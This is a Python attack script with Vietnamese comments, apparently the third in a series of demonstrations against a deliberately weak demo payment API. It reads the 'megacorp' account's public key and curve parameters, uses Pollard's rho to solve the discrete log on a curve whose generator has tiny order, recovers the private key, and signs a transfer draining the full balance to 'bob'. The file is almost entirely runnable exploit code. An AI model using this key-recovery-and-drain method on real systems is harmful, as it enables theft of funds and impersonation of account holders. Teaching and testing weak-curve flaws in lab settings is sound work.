"""TẤN CÔNG 3 — ĐƯỜNG CONG YẾU / Pollard's rho (qua HTTP, API công khai thật).

Tài khoản enterprise 'megacorp' dùng đường cong TRÔNG như thật (trường nguyên tố
~256 bit) nhưng ĐIỂM SINH có bậc quá nhỏ (~2^37, cofactor khổng lồ). Từ khóa công
khai + tham số đường cong (GET /api/accounts), kẻ tấn công giải ECDLP bằng Pollard's
rho để khôi phục KHÓA RIÊNG, rồi ký giao dịch rút sạch megacorp về 'bob'.

    python attack_weakcurve.py     (mất ~15-25s do chạy Pollard's rho)
"""
import time

from common import (banner, step, info, ok, bad, impact, money, get, post,
                    curve_from_info, rho_dlog, sign_transfer)

ATTACKER = "bob"
VICTIM = "megacorp"


def main():
    banner("TẤN CÔNG 3 — ĐƯỜNG CONG YẾU (Pollard's rho)  →  rút sạch MegaCorp")

    step(1, "Lấy khóa công khai + tham số đường cong (GET /api/accounts)")
    _, accounts = get("/api/accounts")
    mc = next((a for a in accounts if a["user"] == VICTIM), None)
    if not mc:
        return bad("Không thấy tài khoản megacorp")
    curve = curve_from_info(mc["curve"])
    Q = curve.point(int(mc["pub"]["x"]), int(mc["pub"]["y"]))
    info("Trường F_p", f"~{curve.p.bit_length()} bit  (trông như đường cong thật)")
    info("Bậc điểm sinh n", f"~2^{curve.n.bit_length()-1}  (QUÁ NHỎ → phá được)")

    step(2, "Giải ECDLP bằng Pollard's rho để khôi phục khóa riêng…")
    print("    (đang chạy, mất ~15-25 giây)")
    t0 = time.time()
    d = rho_dlog(curve, curve.G, Q, curve.n)
    dt = time.time() - t0
    info("KHÓA RIÊNG d", d)
    ok(f"d·G == Q: KHỚP  (rho mất {dt:.1f}s)" if curve.mul(d, curve.G) == Q else "SAI")

    step(3, "Ký giao dịch rút sạch megacorp về 'bob' (POST /api/tx/submit)")
    _, state = get("/api/state")
    amount = next(a["balance"] for a in state["accounts"] if a["user"] == VICTIM)
    tx, r, s = sign_transfer(curve, d, VICTIM, ATTACKER, amount, 950000)
    stt, res = post("/api/tx/submit", {**tx, "r": str(r), "s": str(s)})
    if isinstance(res, dict) and res.get("ok"):
        impact(f"Rút {money(amount)} CBC từ MegaCorp về '{ATTACKER}'")
    else:
        bad(res.get("message") if isinstance(res, dict) else str(res))


if __name__ == "__main__":
    main()
